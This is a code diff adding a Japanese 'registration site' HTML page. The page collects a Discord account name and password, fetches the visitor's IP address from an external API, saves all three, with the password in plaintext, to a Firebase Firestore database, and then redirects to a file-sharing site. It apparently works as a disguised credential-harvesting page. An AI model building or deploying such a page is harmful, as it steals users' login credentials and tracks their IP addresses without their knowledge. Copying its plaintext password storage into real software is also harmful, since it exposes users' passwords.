@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>登録サイト</title>
+    <!-- Firebase SDKのインポート -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+    <style>
+        /* 少しスタイルを追加 */
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>登録サイト</h1>
+
+    <!-- Discordアカウント入力フォーム -->
+    <div id="discord-form">
+        <label for="discordAccount">Discordアカウント名:</label>
+        <input type="text" id="discordAccount" placeholder="Discordアカウント名を入力" required>
+        <button onclick="nextStep()">次へ</button>
+    </div>
+
+    <!-- パスワード入力フォーム -->
+    <div id="password-form" style="display: none;">
+        <label for="password">パスワード:</label>
+        <input type="password" id="password" placeholder="パスワードを設定" required>
+        <button onclick="submitForm()">送信</button>
+    </div>
+
+    <!-- ステータス表示 -->
+    <div id="status"></div>
+
+    <!-- Firebase設定 -->
+    <script>
+        // Firebaseの設定（自分の設定に置き換えてください）
+        const firebaseConfig = {
+          apiKey: "AIzaSyAZs9FyqJ4wjSi-HcVC9SzLentqu8NXBwk",
+          authDomain: "tndr-entryserver.firebaseapp.com",
+          projectId: "tndr-entryserver",
+          storageBucket: "tndr-entryserver.firebasestorage.app",
+          messagingSenderId: "1008351258193",
+          appId: "1:1008351258193:web:55257ec8e18d22b80b3a70",
+        };
+
+        // Firebase初期化
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        let discordAccount = '';
+        let password = '';
+
+        // 次のステップ（パスワード入力フォームを表示）
+        function nextStep() {
+            discordAccount = document.getElementById('discordAccount').value;
+            if (!discordAccount) {
+                alert('Discordアカウント名を入力してください');
+                return;
+            }
+            document.getElementById('discord-form').style.display = 'none';
+            document.getElementById('password-form').style.display = 'block';
+        }
+
+        // フォーム送信
+        async function submitForm() {
+            password = document.getElementById('password').value;
+            if (!password) {
+                alert('パスワードを設定してください');
+                return;
+            }
+
+            document.getElementById('status').textContent = 'お待ちください...';
+
+            // IPアドレスの取得（仮に外部APIを使って取得）
+            const ipAddress = await getIPAddress();
+
+            // Firebaseにデータを送信
+            await saveToFirebase(discordAccount, password, ipAddress);
+            document.getElementById('status').textContent = '登録が完了しました。';
+
+            // 5秒後に自動で転送
+            setTimeout(() => {
+                window.location.href = 'https://gigafile.com';
+            }, 5000);
+        }
+
+        // Firebaseにデータを保存
+        async function saveToFirebase(discord, pass, ip) {
+            const userRef = db.collection('users').doc(discord);
+            await userRef.set({
+                discordAccount: discord,
+                password: pass,
+                ipAddress: ip,
+                createdAt: firebase.firestore.FieldValue.serverTimestamp()
+            });
+        }
+
+        // IPアドレスを取得する関数（外部API使用）
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('IPアドレスの取得に失敗しました', error);
+                return 'Unknown';
+            }
+        }
+    </script>
+</body>
+</html>
